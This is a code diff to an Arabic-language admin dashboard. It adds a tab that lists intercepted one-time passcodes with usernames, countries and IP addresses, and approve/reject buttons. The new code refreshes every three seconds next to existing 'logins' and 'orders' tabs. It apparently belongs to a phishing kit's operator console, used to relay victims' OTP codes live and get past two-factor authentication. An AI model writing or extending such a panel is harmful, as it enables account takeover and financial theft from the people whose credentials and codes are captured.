@@ -221,6 +221,10 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
       تسجيلات الدخول
     </a>
+    <a onclick="showTab('otp')" id="nav-otp">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      رموز OTP
+    </a>
   </nav>
 </aside>
 
@@ -351,6 +355,29 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
       </table>
     </div>
   </div>
+
+  <!-- OTP Tab -->
+  <div class="tab-content" id="tab-otp">
+    <div class="section-title">رموز التحقق OTP <span class="badge" id="otpBadge">0</span></div>
+    <div class="orders-table">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>اسم المستخدم</th>
+            <th>رمز OTP</th>
+            <th>الدولة</th>
+            <th>IP</th>
+            <th>الحالة</th>
+            <th>الإجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="otpBody">
+          <tr><td colspan="7" class="empty-msg">لا توجد رموز تحقق</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -362,11 +389,12 @@ function showTab(tab) {
   document.querySelectorAll('.sidebar-nav a').forEach(function(a) { a.classList.remove('active'); });
   document.getElementById('tab-' + tab).classList.add('active');
   document.getElementById('nav-' + tab).classList.add('active');
-  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', logins: 'تسجيلات الدخول' };
+  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', logins: 'تسجيلات الدخول', otp: 'رموز OTP' };
   document.getElementById('pageTitle').textContent = titles[tab];
   if (tab === 'orders') { loadOrders(); }
   if (tab === 'visitors') loadVisitors();
   if (tab === 'logins') loadLogins();
+  if (tab === 'otp') loadOTP();
 }
 
 var adminToken = '';
@@ -550,6 +578,50 @@ function loginAction(id, status) {
   });
 }
 
+var otpData = [];
+
+function loadOTP() {
+  fetch('/api/otp-attempts', { headers: authHeaders() }).then(checkAuth).then(function(d) {
+    if (!d) return;
+    otpData = d.attempts || [];
+    renderOTP();
+  }).catch(function() {});
+}
+
+function renderOTP() {
+  var tb = document.getElementById('otpBody');
+  var waiting = otpData.filter(function(a) { return a.status === 'waiting'; }).length;
+  document.getElementById('otpBadge').textContent = waiting > 0 ? waiting + ' بانتظار القرار' : otpData.length + ' رمز';
+  if (otpData.length === 0) {
+    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد رموز تحقق</td></tr>';
+    return;
+  }
+  tb.innerHTML = '';
+  otpData.forEach(function(a) {
+    var sc = a.status === 'approved' ? 'approved' : a.status === 'rejected' ? 'rejected' : 'waiting';
+    var st = a.status === 'approved' ? 'مقبول' : a.status === 'rejected' ? 'مرفوض' : 'بانتظار القرار';
+    var tr = document.createElement('tr');
+    var actions = '';
+    if (a.status === 'waiting') {
+      actions = '<button class="btn-sm btn-details" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="otpAction(' + a.id + ',\'approved\')">قبول</button><button class="btn-sm btn-details" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="otpAction(' + a.id + ',\'rejected\')">رفض</button>';
+    } else {
+      actions = '<span class="status-badge ' + sc + '">' + st + '</span>';
+    }
+    tr.innerHTML = '<td>' + a.id + '</td><td>' + (a.username || '-') + '</td><td dir="ltr" style="text-align:right;font-family:monospace;font-size:1.1rem;letter-spacing:3px;font-weight:700;color:#00c8ff;">' + (a.otp || '-') + '</td><td>' + (a.country || '-') + '</td><td dir="ltr" style="text-align:right">' + (a.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actions + '</td>';
+    tb.appendChild(tr);
+  });
+}
+
+function otpAction(id, status) {
+  fetch('/api/otp-attempts/status', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+    body: JSON.stringify({ id: id, status: status })
+  }).then(function() {
+    loadOTP();
+  });
+}
+
 // Init
 var now = new Date();
 var months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
@@ -559,11 +631,13 @@ document.getElementById('currentDate').textContent = days[now.getDay()] + ' ' + 
 loadStats();
 loadOrders();
 loadLogins();
+loadOTP();
 
 setInterval(function() {
   loadStats();
   loadOrders();
   loadLogins();
+  loadOTP();
 }, 3000);
 
 document.getElementById('detailsModal').addEventListener('click', function(e) {
